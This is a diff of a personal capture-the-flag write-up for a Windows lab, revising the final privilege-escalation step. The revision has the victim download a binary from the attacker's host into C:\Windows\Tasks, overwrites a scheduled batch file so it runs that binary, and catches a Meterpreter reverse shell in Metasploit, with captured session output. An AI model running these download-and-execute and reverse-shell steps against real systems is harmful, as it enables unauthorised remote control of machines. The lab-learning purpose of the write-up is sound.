@@ -269,7 +269,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.
 > Victim
 
 ```Powershell
-PS C:\Invoke-WebRequest -Uri http://192.168.137.208:8000/fun.exe -OutFile C:\Windows\Tasks\cleanup.exe
+PS C:\Invoke-WebRequest -Uri http://192.168.137.208:8000/lol.exe -OutFile C:\Windows\Tasks\shell.exe
 
 PS C:\Windows\Tasks> dir
 dir
@@ -281,7 +281,7 @@ dir
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 -a----        9/23/2026   2:18 PM           7680 cleanup.bat
--a----        9/23/2026   2:18 PM           7680 cleanup.exe                                                           
+-a----        9/23/2026   2:18 PM           7680 shell.exe                                                          
 
 PS C:\Windows\Tasks>
 ```
@@ -289,15 +289,44 @@ PS C:\Windows\Tasks>
 > Overwrite the content with echo:
 
 ```Powershell
-echo C:\Windows\Tasks\cleanup.exe > .\cleanup.bat
+cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
 ```
 
-> Open a listener on port 9001, receive the connection and read the flag.
+> Open a listener on port 5555 using metasploit, receive the connection and read the flag.
 
-```Powershell
-type C:\flag4.txt
+```zsh
+msf > use multi/handler
 ```
+
+```zsh
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+
+msf exploit(multi/handler) > set lhost 192.168.137.208
+lhost => 192.168.137.208
+
+sf exploit(multi/handler) > set lport 4440
+lport => 4440
+msf exploit(multi/handler) > set lport 5555
+lport => 5555
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.137.208:5555 
+[*] Sending stage (248902 bytes) to 10.129.191.188
+[*] Meterpreter session 1 opened (192.168.137.208:5555 -> 10.129.191.188:50093) at 2026-09-23 12:06:04 -0400
+
+meterpreter > shell
+Process 380 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+C:\>type flag4.txt
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2020-10-08.png)
 
 ---
 
-> The lab was too problematic for me, I had to restart like 9-10 times, did the whole thing from the start, but unfortunately for me, it did not work out, and the last reverse shell was just impossible to get, though I was doing everything right, even with the help of writeups. Sorry about that :( 
+> The lab was too problematic for me, I had to restart like 9-10 times, did the whole thing from the start, and I was finally going to give up, but thanks to metasploit, and meterpreter, I finally got things to work!! :)  HAPPY HACKING!
